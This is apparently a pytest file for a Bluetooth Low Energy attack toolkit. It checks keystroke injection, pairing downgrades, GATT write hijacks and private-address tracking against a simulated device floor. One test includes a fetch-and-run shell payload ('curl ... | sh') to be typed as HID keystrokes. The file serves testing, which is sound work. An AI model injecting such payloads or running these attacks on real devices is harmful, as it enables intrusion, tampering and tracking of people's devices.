"""The BLE wave: HID injection, the downgrades around it, and identity.

Eight attacks, and one of them is the one an operator asks for by name: ``ble_hid``.  A
BLE keyboard is a GATT server that *notifies* its host, and a host that subscribes to the
report characteristic believes every notification it receives — so the wave tests both
halves of that sentence.  Every attack here is exercised against
:mod:`wifipilot.blesim` with real HCI commands and real protocol bytes, and the outcomes
asserted below come out of the same decoders an offline analysis of a capture uses.

The file also pins the primitives the wave introduced: the AES identity resolution that
makes the reconnect and tracker attacks possible, the HID report encoder/decoder pair, and
the link-layer opcode table, which a capture's LL PDUs are named from and which is only
worth having if it matches the specification.
"""

from __future__ import annotations

import string

import pytest

from wifipilot import bt, blesim
from wifipilot.attacks import ATTACK_CLASSES, blehid, meta
from wifipilot.attacks.base import AttackContext
from wifipilot.models import AccessPoint

#: what the wave types when nobody says otherwise: a command line, Enter included.  The
#: count assertions below are derived from it, so a change of default cannot make them lie.
PAYLOAD = blehid.DEFAULT_HID_PAYLOAD
KEYSTROKES = len(PAYLOAD)
REPORTS = KEYSTROKES * 2                                # press and release, per keystroke

#: the wave, in the order the registry carries it
WAVE = ("ble_hid", "ble_hid_audit", "ble_hid_boot", "ble_hid_reconnect",
        "ble_smp_downgrade", "ble_gatt_hijack", "ble_irk_resolve",
        "ble_conn_param_hijack")

#: the host the demo aims the keyboard at by default: a desktop that paired a keyboard
#: with Just Works and takes input reports from anybody who looks like one
TRUSTING = "00:1a:7d:11:22:06"

#: the negative control: a television that takes HID input only over a bonded, encrypted
#: link, and that verifies the peer when it is asked to reconnect
STRICT = "3c:11:22:33:00:03"


@pytest.fixture()
def ctx(config, bus, session) -> AttackContext:
    config.demo = True
    config.bt_timeout = 1.0
    return AttackContext(session=session, config=config, bus=bus, demo=True)


@pytest.fixture()
def ap() -> AccessPoint:
    return AccessPoint(bssid="aa:bb:cc:11:22:33", essid="demo-bridge", channel=6,
                       signal=-40)


@pytest.fixture(autouse=True)
def fresh_floor():
    """A fresh floor and a fresh aim for every test, so one run cannot be another's state."""
    blesim.reset_ble()
    blesim.reset_targets()
    yield
    blesim.reset_ble()
    blesim.reset_targets()


def run(name: str, ctx: AttackContext, ap: AccessPoint, target: str = ""):
    """Run one attack of the wave, optionally aimed at a named device."""
    if target:
        ctx.config.bt_target = target
    return ATTACK_CLASSES[name]().run(ctx, ap)


# --------------------------------------------------------------------------- #
# the wave is wired into everything that reads the registry
# --------------------------------------------------------------------------- #

def test_the_wave_is_registered():
    from wifipilot.attacks import DEFAULT_ORDER
    from wifipilot.models import ATTACK_NAMES

    assert len(WAVE) == 8
    for name in WAVE:
        assert name in ATTACK_CLASSES, name
        assert name in DEFAULT_ORDER, name
        assert name in ATTACK_NAMES, name
        assert blesim.role_for(name) != "any", name
        entry = meta.meta_for(name)
        assert entry["domain"] == "bluetooth", name
        assert entry["detection"], name
    assert meta.validate() == []


def test_every_attack_of_the_wave_has_a_role_and_a_budget(config):
    for name in WAVE:
        role = blesim.ATTACK_ROLES[name]
        assert role in blesim.LINK_ROLES, (name, role)
        assert blesim.ble().candidates(role), (name, role)
        assert config.attack_timeout_for(name) > 0, name


# --------------------------------------------------------------------------- #
# 1. the injection
# --------------------------------------------------------------------------- #

def test_hid_injection_types_on_a_trusting_host(ctx, ap):
    """The headline attack: the host connects, subscribes, and runs what it is told."""
    outcome = run("ble_hid", ctx, ap)
    extra = outcome.extra

    assert outcome.status == "success"
    assert extra["target"] == TRUSTING
    assert extra["report_handle"] == "0x0005"          # enumerated from the peer's table
    assert extra["accepted"] == extra["sent"] == REPORTS
    assert extra["keystrokes"] == KEYSTROKES
    assert extra["typed"] == PAYLOAD
    assert extra["payload"] == PAYLOAD
    assert extra["untypable"] == []
    # the reports really are the eight-byte boot reports the specification describes
    reports = bt.hid_key_reports(PAYLOAD)
    assert all(len(report) == 8 for report in reports)
    assert bt.hid_decode_stream(reports)["text"] == PAYLOAD


def test_the_bonded_host_refuses_the_keyboard(ctx, ap):
    """The negative half: a host that checks the link takes nothing from a stranger."""
    outcome = run("ble_hid", ctx, ap, target=STRICT)
    extra = outcome.extra

    assert outcome.status == "success"
    assert extra["target"] == STRICT
    assert extra["accepted"] == 0
    assert extra["refused"] == extra["sent"] == REPORTS
    assert extra["typed"] == ""
    assert "refused" in outcome.result.lower()


def test_the_audit_finds_who_takes_input(ctx, ap):
    """The survey an operator runs first: five HID hosts, three of them open."""
    outcome = run("ble_hid_audit", ctx, ap)
    rows = outcome.extra["hosts"]

    assert len(rows) == 5
    assert outcome.extra["exposed"] == 3
    assert {row["profile"] for row in rows} == {"hid_trusting", "hid_bonded"}
    accepting = {row["address"] for row in rows if row["accepts_input"]}
    assert accepting == {"00:1a:7d:11:22:06", "3c:11:22:33:00:01", "3c:11:22:33:00:02"}
    for row in rows:
        assert row["report_handle"].startswith("0x")
        assert row["hid_information"]                      # read over ATT, not invented
        if row["profile"] == "hid_trusting":
            # the HID service answers a stranger: the report map is the boot keyboard
            assert row["report_map_bytes"] == len(bt.HID_KEYBOARD_REPORT_MAP)
            assert row["report_map_note"] == "boot keyboard"
            assert row["hid_information"] == "11010003"    # bcdHID 1.11, normally connectable
        else:
            # the host that checks the writer answers with an ATT error instead
            assert row["report_map_bytes"] == 0
            assert "Insufficient Authentication" in row["report_map_note"]


def test_the_boot_downgrade_is_proved_by_reading_the_value_back(ctx, ap):
    outcome = run("ble_hid_boot", ctx, ap)
    extra = outcome.extra

    assert extra["downgraded"] is True
    assert extra["mode_before"] == "01"                    # report protocol
    assert extra["mode_after"] == "00"                     # boot protocol
    assert extra["write"]["accepted"] is True
    assert extra["typed"] == PAYLOAD
    assert extra["protocol"] == "boot (0x00)"


def test_the_reconnect_hijack_counts_both_outcomes(ctx, ap):
    """Three hosts came to the impersonated keyboard; two checked the key and stayed away."""
    outcome = run("ble_hid_reconnect", ctx, ap)
    extra = outcome.extra

    assert extra["identity"]["name"] == "WF-KEYBOARD"
    assert extra["identity"]["address"] == "5c:11:22:33:44:aa"
    assert len(extra["reconnected"]) == 3
    assert len(extra["refused"]) == 2
    assert {entry["host"] for entry in extra["refused"]} == {STRICT, "3c:11:22:33:00:04"}
    assert all("link key" in entry["why"] for entry in extra["refused"])
    # the hosts that reconnected were typed on, over the link they opened
    assert {entry["delivery"]["typed"] for entry in extra["reconnected"]} == {PAYLOAD}
    assert all(entry["delivery"]["accepted"] for entry in extra["reconnected"])


def test_the_pairing_downgrade_reports_what_the_devices_settled_for(ctx, ap):
    outcome = run("ble_smp_downgrade", ctx, ap)
    extra = outcome.extra

    assert extra["offered"] == {"auth": "0x00", "key_size": 7}
    assert extra["downgraded"] > 0 and extra["refused"] > 0
    assert 7 in extra["key_sizes"]
    # the KNOB-class device negotiates the one-byte key it is vulnerable for
    assert 1 in extra["key_sizes"]
    refused = [row for row in extra["devices"] if row["refused"]]
    assert all(row["reason"] for row in refused)
    assert any("authentication requirements" in row["reason"] for row in refused)
    accepted = [row for row in extra["devices"] if row["downgraded"]]
    assert all(row["secure_connections"] is False for row in accepted)


def test_the_gatt_hijack_reads_back_what_it_wrote(ctx, ap):
    outcome = run("ble_gatt_hijack", ctx, ap)
    extra = outcome.extra
    changed = [row for row in extra["characteristics"] if row["changed"]]

    assert extra["changed"] >= 1
    for row in changed:
        assert row["before"] != row["after"]
        assert row["after"].startswith(extra["marker"])
        assert row["accepted"] is True
        assert row["properties"] and "write" in row["properties"]


def test_the_irk_scan_follows_a_device_through_its_addresses(ctx, ap):
    outcome = run("ble_irk_resolve", ctx, ap)
    extra = outcome.extra

    assert extra["dictionary_size"] >= 4
    assert extra["followed"] >= 1
    followed = [entry for entry in extra["identities"] if len(entry["addresses"]) >= 2]
    for entry in followed:
        assert len(set(entry["addresses"])) == len(entry["addresses"])
        assert entry["label"]
        assert bt.classify_address(entry["addresses"][0]) == "resolvable private"
    # and the addresses really do change between scans, which is the point
    assert extra["passes"][0] != extra["passes"][1]


def test_the_connection_hijack_reports_both_answers(ctx, ap):
    outcome = run("ble_conn_param_hijack", ctx, ap)
    extra = outcome.extra
    accepted = [row for row in extra["answers"] if row["accepted"]]
    rejected = [row for row in extra["answers"] if row["opcode"] == "0x11"]

    assert extra["accepted"] >= 1
    assert rejected, extra["answers"]
    assert all(row["error"] == "invalid LL parameters" for row in rejected)
    assert extra["request_hex"].startswith("00")           # LL_CONNECTION_UPDATE_IND
    assert extra["requested"] == {"interval_ms": 7.5, "latency": 0, "supervision_ms": 2000}
    assert all(row["answer"] in ("LL_CONNECTION_UPDATE_IND", "LL_REJECT_EXT_IND")
               for row in accepted + rejected)


# --------------------------------------------------------------------------- #
# the primitives the wave runs on
# --------------------------------------------------------------------------- #

def test_the_identity_key_resolution_is_the_specifications_derivation():
    key = blesim.IRK_DICTIONARY[0]["irk"]
    addresses = [bt.rpa_from_irk(key, seed) for seed in (1, 2, 3)]

    assert len(set(addresses)) == 3                       # the address rotates
    for address in addresses:
        assert bt.classify_address(address) == "resolvable private"
        assert bt.resolves_irk(key, address)
    # and a key that is not the device's does not resolve it
    assert not bt.resolves_irk(blesim.IRK_DICTIONARY[1]["irk"], addresses[0])
    assert blesim.resolve_address(addresses[0]), "the dictionary cannot resolve its own key"


def test_the_hid_decoder_reads_back_what_the_encoder_sent():
    reports = bt.hid_key_reports("id\n")

    assert len(reports) == 6                          # three keystrokes, press and release
    decoded = bt.hid_decode_stream(reports)
    assert decoded["text"] == "id\n"
    assert [stroke["text"] for stroke in decoded["strokes"]] == ["i", "d", "\n"]
    # a modifier is a chord, and a chord is not text
    chord = bt.hid_decode_report(bt.hid_boot_report(5, [bt.hid_key("c")]))
    assert chord["modifiers"] == 5                     # ctrl (1) + alt (4), not text
    assert chord["ctrl"] is True and chord["alt"] is True
    assert chord["text"] == ""
    assert bt.hid_report_text("i") == "i"              # a key name, not a report
    assert bt.hid_report_text("minus", shift=True) == "_"
    assert bt.hid_report_text("minus") == "-"


def test_a_keyboard_can_type_a_command_line_not_just_a_word():
    """The payload is something an operator would run, so punctuation has to arrive."""
    payload = "curl -s http://10.0.0.1/x.sh|sh\n"
    reports = bt.hid_key_reports(payload)
    presses, untypable = bt.hid_type_plan(payload)

    assert untypable == []
    assert len(presses) == len(payload)
    assert len(reports) == 2 * len(payload)            # every keystroke presses and releases
    assert bt.hid_decode_stream(reports)["text"] == payload
    # and every printable character survives the round trip, one at a time
    for character in string.printable.replace("\r", ""):
        if character in "\x0b\x0c":                   # no key for vertical tab or form feed
            continue
        typed = bt.hid_decode_stream(bt.hid_key_reports(character))["text"]
        assert typed == character, repr(character)
    # a carriage return is the Enter key, and the decoder calls that a newline
    assert bt.hid_key_reports("\r") == bt.hid_key_reports("\n")
    # what cannot be typed is *reported*, not silently dropped
    _presses, missing = bt.hid_type_plan("ok\x01\x02")
    assert missing == ["\x01", "\x02"]


def test_a_pairing_request_is_the_bytes_the_peer_parses():
    request = bt.smp_pairing_request(auth=0x00, key_size=7)
    parsed = bt.parse_smp(request)

    assert request.hex() == "01030000070f0f"
    assert parsed["command"] == 0x01 and parsed["name"] == "Pairing Request"
    assert parsed["max_key_size"] == 7
    assert parsed["mitm"] is False and parsed["secure_connections"] is False
    assert parsed["auth_bits"] == []
    strong = bt.parse_smp(bt.smp_pairing_request(auth=0x0D, key_size=16))
    assert strong["mitm"] and strong["secure_connections"] and strong["bonding"]


def test_the_link_layer_table_follows_the_specification():
    """These opcodes are how a capture's LL PDUs are named, so they are worth pinning."""
    assert bt.LL_CONTROL_OPCODES[0x00] == "LL_CONNECTION_UPDATE_IND"
    assert bt.LL_CONTROL_OPCODES[0x08] == "LL_FEATURE_REQ"
    assert bt.LL_CONTROL_OPCODES[0x0C] == "LL_VERSION_IND"
    assert bt.LL_CONTROL_OPCODES[0x11] == "LL_REJECT_EXT_IND"
    assert bt.LL_CONTROL_OPCODES[0x12] == "LL_PING_REQ"
    assert bt.LL_CONTROL_OPCODES[0x13] == "LL_PING_RSP"
    assert bt.LL_CONTROL_OPCODES[0x14] == "LL_LENGTH_REQ"
    # a feature page is read out of the three feature PDUs, by their specification opcodes
    header = bt.parse_ll_header(bytes([0x03, 0x09, 0x08])
                                + ((1 << 0) | (1 << 5)).to_bytes(8, "little"))
    assert header["control"] == "LL_FEATURE_REQ"
    assert header["features"]["LE Encryption"] is True
    assert header["features"]["LE Data Packet Length Extension"] is True
    assert header["features"]["LE 2M PHY"] is False
    # and the privacy hash itself is the specification's own sample data (Vol 3, Part H,
    # Appendix D.7): one AES block, and the hash is the low 24 bits of its output
    irk = bytes.fromhex("ec0234a357c8ad05341010a60a397d9b")
    assert bt.random_address_hash(irk, 0x708194) == 0x0DFBAA


def test_create_connection_reaches_the_device_the_attack_named():
    """An off-by-one in the peer address connects to somebody else: the sim pins it."""
    airspace = blesim.reset_ble()
    sock = blesim.controller_socket(None, address=TRUSTING, role="hid")
    before = sock.controller.link

    bt.hci_send(sock, bt.le_create_connection(TRUSTING), timeout=1.0)

    assert sock.controller.link is before
    assert sock.controller.link.device.address == TRUSTING
    assert sock.controller.connected == [TRUSTING]
    assert airspace.by_address(TRUSTING) is before.device


def test_the_floor_has_the_postures_the_wave_needs():
    airspace = blesim.ble()
    floor = blesim.summary()

    # 50 when the HID wave landed; the imitation and takeover waves took it to 66
    # across 14 postures
    assert floor["devices"] == 66 and floor["profiles"] == 14
    assert "hid_trusting" in blesim.PROFILES and "hid_bonded" in blesim.PROFILES
    hosts = airspace.candidates("hid")
    assert len(hosts) == 5
    # the HID hosts are the five that remember one keyboard; the later waves put other
    # bonded pairs on the floor (a speaker, a car kit, a badge reader), so the assertion
    # is about this keyboard's hosts rather than about every bond on the floor
    bonded = [device for device in hosts if device.bond_peer]
    assert len(bonded) == 5
    assert {device.bond_peer for device in bonded} == {"WF-KEYBOARD"}
    assert {device.bond_address for device in bonded} == {"5c:11:22:33:44:aa"}
    # the profiles disagree about the two things the wave turns on
    trusting = next(device for device in hosts if device.profile == "hid_trusting")
    strict = next(device for device in hosts if device.profile == "hid_bonded")
    assert trusting.flags["hid_bond_required"] is False
    assert trusting.flags["gatt_write"] is True
    assert strict.flags["hid_bond_required"] is True
    assert strict.flags["verify_bond_peer"] is True
    assert len(blesim.IRK_DICTIONARY) >= 4


def test_a_refused_attack_leaves_the_evidence_on_the_link(ctx, ap):
    """The transcripts are the audit trail: a run that finds nothing still says what it did."""
    run("ble_hid", ctx, ap, target=STRICT)
    link = blesim.ble().link_for(STRICT, "hid")
    events = [entry for entry in link.transcript if entry.get("event") == "hid"]

    assert link.hid_refused >= 4
    assert link.hid_reports == []
    assert all(entry["refused"] for entry in events)
    assert any("bonded" in str(entry["refused"]) for entry in events)


def test_the_writes_persist_on_the_simulated_device(ctx, ap):
    """A write the device forgets cannot be read back, so the ATT table keeps it."""
    device = blesim.ble().by_address("d0:0a:11:22:33:44")          # the vendor lock
    row = next(row for row in device.gatt_rows()
               if int(row.get("uuid") or 0) == 0xFEE9)             # Lock Control
    sock = blesim.controller_socket(None, address=device.address, role="gatt")
    link = sock.controller.link

    assert _att_write(sock, link, row["handle"], b"\x01")["accepted"] is True
    after = next(item["value"] for item in device.gatt_rows()
                 if item["handle"] == row["handle"])
    assert after == b"\x01" and device.written[row["handle"]] == b"\x01"
    assert link.writes == 1
    assert _att_read(sock, link, row["handle"]) == b"\x01"


def _att_write(sock, link, handle: int, value: bytes):
    from wifipilot.attacks.blehid import _att_write as write
    return write(sock, link, handle, value)


def _att_read(sock, link, handle: int) -> bytes:
    from wifipilot.attacks.blehid import _att_read as read
    return read(sock, link, handle)[0]


def test_the_it_segment_is_untouched_by_the_wave():
    """The wave is Bluetooth-only: the IT floor and its counts are somebody else's tests."""
    from wifipilot import itsim

    lan = itsim.reset_demo_lan()
    assert len(lan.hosts) == 51
    assert not [name for name in WAVE if name.startswith("it_")]
